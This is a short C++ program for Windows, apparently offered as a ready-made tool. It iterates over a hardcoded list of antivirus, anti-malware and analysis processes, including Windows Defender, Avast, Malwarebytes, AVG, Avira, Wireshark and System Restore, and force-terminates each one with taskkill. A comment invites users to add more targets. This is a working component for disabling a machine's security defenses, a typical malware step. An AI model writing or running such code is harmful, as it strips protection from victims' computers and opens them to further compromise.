#include <string>
#include <iostream>
#include <Windows.h>
#include <sstream>
#include <winsock.h>
#include <tchar.h>
#include <cassert>
#include <list>
#include <algorithm>
#include <iterator>
#include <sstream>
#include <vector>
using namespace std;
// Dem headers
// Was using these for something so judge all you want boys

int main()
{
    string processList[] = { "AvastUI.exe", 
                             "SDWinSec.exe", 
                             "mbam.exe", 
                             "SDMain.exe", 
                             "SDFiles.exe",
                             "blindman.exe", 
                             "MsMpEng.exe",
                             "msseces.exe", 
                             "MpCmdRun.exe", 
                             "MSASCui.exe",
                             "ComboFix.exe", 
                             "wireshark.exe", 
                             "avp.exe", 
                             "keyscrambler.exe",
                             "bdagent.exe", 
                             "zlclient.exe",
                             "egui.exe", 
                             "avgwdsvc.exe",
                             "avgrsx.exe", 
                             "avgidsagent.exe",
                             "avgcsrvx.exe", 
                             "avgui.exe",
                             "avgnt.exe",
                             "avguard.exe", 
                             "avcenter.exe", 
                             "ccuac.exe",
                             "spybotsd.exe", 
                             "hijackthis.exe", 
                             "mbamservice.exe", 
                             "mbamscheduler.exe", 
                             "mbampt.exe",
                             "mbamgui.exe",
                             "instup.exe",
                             "avscan.exe",
                             "AvastUI.exe",
                             "avconfig.exe", 
                             "AvastSvc.exe", 
                             "rstrui.exe" }; 
    // if you keep adding to these, it will fill out the rest for you. Just list what you want.
    int i;
    for (i = 0; i < (sizeof(processList) / sizeof(*processList)); i++) {

        string test = "taskkill /F /T /IM " + processList[i]; // Kill it
        system(test.c_str()); // Run it
    }
    cout << "\nDone!" << endl; // Done
    getchar();
    return 0;
}
